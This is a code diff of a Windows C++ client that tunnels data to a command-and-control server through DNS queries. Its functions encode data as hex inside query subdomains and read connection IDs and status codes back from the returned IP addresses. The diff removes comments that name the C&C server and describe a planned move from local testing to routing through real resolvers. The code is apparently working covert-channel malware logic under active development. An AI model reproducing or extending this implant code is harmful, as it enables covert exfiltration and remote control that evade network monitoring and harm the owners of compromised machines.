@@ -12,18 +12,7 @@
 #pragma comment(lib, "Dnsapi.lib") 
 #pragma comment(lib, "Ws2_32.lib")
 
-/**
- * Establishes connection with DNS server via DNS query
- * 
- * LOCAL TEST MODE:
- *   Sends query directly to C&C server (DNS_SERVER_IP = 127.0.0.1)
- * 
- * PRODUCTION MODE (Future):
- *   Sends query to DNS Resolver → Resolver forwards to C&C server
- * 
- * Query: a.1.1.1.domain
- * Returns: Connection ID extracted from last octet of response IP
- */
+
 int startConnection(const char* domain) {
 	if (!domain) {
 		return -1;
@@ -35,7 +24,6 @@ int startConnection(const char* domain) {
 	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord = nullptr;
 	
-	// LOCAL TEST MODE: Direct to C&C Server
 
 	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
 	if (!pSrvList) {
@@ -65,7 +53,6 @@ int startConnection(const char* domain) {
 		return -1;
 	}
 	
-	// Parse response IP - last octet is Connection ID
 	IN_ADDR ipaddr;
 	ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
 	std::string ipStr = inet_ntoa(ipaddr);
@@ -80,11 +67,7 @@ int startConnection(const char* domain) {
 	return connectionId;
 }
 
-/**
- * Send data via DNS tunneling
- * Format: b.packetNum.connectionId.hexData.domain
- * Response IP first octet = status code
- */
+
 int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 	if (!domain || !data) {
 		return -1;
@@ -98,8 +81,6 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord = nullptr;
 	
-	// LOCAL TEST MODE: Direct to C&C Server
-	
 	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
 	if (!pSrvList) {
 		return -1;
@@ -111,7 +92,6 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 	DNS_STATUS status;
 	int retCode = -1;
 	
-	// Retry up to 3 times (reduced from 5)
 	for (int i = 0; i < 3; i++) {
 		pDnsRecord = nullptr;
 		
@@ -131,7 +111,6 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 			std::string ipStr = inet_ntoa(ipaddr);
 			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
 			
-			// First octet = response code
 			size_t firstDot = ipStr.find(".");
 			if (firstDot == std::string::npos) {
 				goto cleanup;
@@ -180,12 +159,7 @@ cleanup:
 	return retCode;
 }
 
-/**
- * Send data via DNS tunneling
- * Format: c.packetNum.connectionId.hexData.domain
- * Response IP first octet = status code
- */
-int sendDataTypeC(int& id, int& packetNumber, int& offset, const char* domain, const char* data) {
+int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain, const char* data) {
 	if (!domain || !data) {
 		return -1;
 	}
@@ -198,8 +172,6 @@ int sendDataTypeC(int& id, int& packetNumber, int& offset, const char* domain, c
 	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord = nullptr;
 	
-	// LOCAL TEST MODE: Direct to C&C Server
-	
 	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
 	if (!pSrvList) {
 		return -1;
@@ -211,7 +183,6 @@ int sendDataTypeC(int& id, int& packetNumber, int& offset, const char* domain, c
 	DNS_STATUS status;
 	int retCode = -1;
 	
-	// Retry up to 3 times (reduced from 5)
 	for (int i = 0; i < 3; i++) {
 		pDnsRecord = nullptr;
 		
@@ -231,7 +202,6 @@ int sendDataTypeC(int& id, int& packetNumber, int& offset, const char* domain, c
 			std::string ipStr = inet_ntoa(ipaddr);
 			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
 			
-			// First octet = response code
 			size_t firstDot = ipStr.find(".");
 			if (firstDot == std::string::npos) {
 				goto cleanup;
@@ -280,10 +250,6 @@ int sendDataTypeC(int& id, int& packetNumber, int& offset, const char* domain, c
 	return retCode;
 }
 
-/**
- * Convert string to hex encoding for DNS tunneling
- * Example: "Hello" -> "48656c6c6f"
- */
 std::string convertToHex(const char* string) {
 	if (!string) {
 		return "";
